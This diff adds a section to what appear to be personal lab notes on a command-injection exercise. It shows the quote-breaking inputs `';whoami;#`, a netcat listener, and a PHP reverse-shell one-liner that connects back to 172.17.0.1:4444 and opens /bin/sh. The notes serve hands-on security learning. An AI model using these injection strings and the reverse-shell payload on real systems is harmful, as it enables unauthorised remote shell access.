@@ -2347,3 +2347,23 @@ we can:
 
 #### Command injection 0x03
 goal -->  popup a shell
+This is our input
+![[Pasted image 20240308152423.png]]
+
+Let's try to inject in the last one
+- the command ends as an `'`
+	- we can try to put as last parameter -->  `';whoami;`
+		- this don't work but we don't have an error
+		  =>
+		- try with -->  `';whoami;#`     (to don't execute the last line)
+		  _<span style="color:#00b050">it works</span> 
+		  ![[Pasted image 20240308152942.png]]
+
+Now we want a shell:
+- `';which php;#` -->  php is available and is in `/usr/local/bin/php`
+  =>
+<span style="background:#fff88f">we can spawn a php shell:</span>
+- `nc -nlvp 4444` -->  setup a listener
+- grab a php payload from -->  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
+- `';php -r '$sock=fsockopen("172.17.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");';#`
+  _<span style="color:#00b050">WE HAVE A SHELL </span> 
